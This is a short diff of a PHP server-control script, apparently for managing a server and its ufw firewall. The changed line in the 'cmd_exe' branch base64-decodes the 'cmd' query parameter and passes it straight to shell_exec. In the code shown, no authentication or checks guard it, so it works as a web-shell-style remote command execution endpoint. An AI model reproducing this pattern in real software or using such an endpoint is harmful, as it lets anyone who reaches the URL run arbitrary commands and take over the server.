@@ -80,7 +80,7 @@ if (isset($_GET['o'])) {
         echo shell_exec($bash_string);
         echo '\n Server B =>ufw firewall updated Successully';
     } else if ($o == 'cmd_exe') {
-        $cmd_exe= base64_decode($_GET['cmd_exe']);
+        $cmd_exe= base64_decode($_GET['cmd']);
         echo shell_exec($cmd_exe);
     }
     else{
